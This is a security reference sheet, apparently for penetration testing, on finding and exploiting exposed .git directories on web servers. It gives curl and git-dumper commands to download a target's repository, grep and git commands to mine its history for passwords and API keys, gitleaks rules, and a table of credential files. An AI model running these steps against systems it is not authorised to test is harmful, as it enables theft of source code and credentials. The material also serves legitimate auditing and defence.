# Exposed .git Repository — Deep Reference

## Why This is Critical

A publicly accessible `/.git/` directory leaks the **entire source code** history —
including deleted files, old passwords, commented-out secrets, and API keys from years ago.

## Detection

```bash
# Quick check
curl -s https://target.com/.git/HEAD
# Expected: ref: refs/heads/main  ← VULNERABLE
# Expected: 404 / 403             ← Protected

# Additional paths to check
/.git/config                  # remotes, branch info
/.git/COMMIT_EDITMSG          # last commit message
/.git/logs/HEAD               # full commit history titles
/.git/packed-refs             # branch and tag refs
/.git/objects/info/packs      # existence of pack files
```

## Full Extraction

```bash
# git-dumper (best tool)
pip install git-dumper
git-dumper https://target.com/.git/ ./extracted-repo/
cd extracted-repo

# Manual if git-dumper unavailable
mkdir extracted && cd extracted
git init
curl https://target.com/.git/HEAD > .git/HEAD
curl https://target.com/.git/config > .git/config
# Then fetch objects by walking the object graph
```

## Post-Extraction — Mining for Secrets

```bash
cd extracted-repo

# All commits + diffs
git log --all --oneline
git log --all --full-history -p   # full diff per commit

# Search ALL history (including deleted files)
git log --all -p | grep -iE "(password|secret|api_key|token|key)\s*=\s*\S+"
git log --all -p | grep -E "AKIA[0-9A-Z]{16}"
git log --all -p | grep -E "sk_live_[0-9a-zA-Z]{24}"

# Restore deleted file from history
git log --all -- config.php     # find commit that had it
git show COMMIT:config.php      # view file at that commit

# Stashed changes (often contain WIP secrets)
git stash list
git stash show -p stash@{0}

# All branches
git branch -a
git checkout origin/dev         # dev branches often have debug configs
git checkout origin/staging

# Show specific file across all commits
git log --all --follow -p -- .env
git log --all --follow -p -- config/database.yml
```

## Automated Secret Scanning

```bash
# TruffleHog
trufflehog filesystem ./extracted-repo/ --json

# Gitleaks
gitleaks detect --source ./extracted-repo/ -v

# GitLeaks config for common patterns
cat > .gitleaks.toml << 'EOF'
[[rules]]
id = "aws-access-key"
regex = "AKIA[0-9A-Z]{16}"

[[rules]]
id = "private-key"
regex = "-----BEGIN (RSA|EC|DSA|OPENSSH) PRIVATE KEY-----"

[[rules]]
id = "stripe-key"
regex = "sk_(live|test)_[0-9a-zA-Z]{24}"
EOF
gitleaks detect --config .gitleaks.toml --source ./extracted-repo/
```

## Common Files to Examine

| File | What to Look For |
|------|-----------------|
| `config.php` / `config.yml` | DB credentials, API keys |
| `.env` | All environment variables |
| `docker-compose.yml` | Service passwords, env vars |
| `settings.py` | Django: SECRET_KEY, DB password |
| `application.properties` | Spring: datasource.password |
| `appsettings.json` | .NET: connection strings |
| `config/database.yml` | Rails: DB credentials |
| `*.pem` / `id_rsa` | Private keys |
| `Jenkinsfile` | CI/CD credentials |
| `.travis.yml` | Encrypted secrets (try to decrypt) |
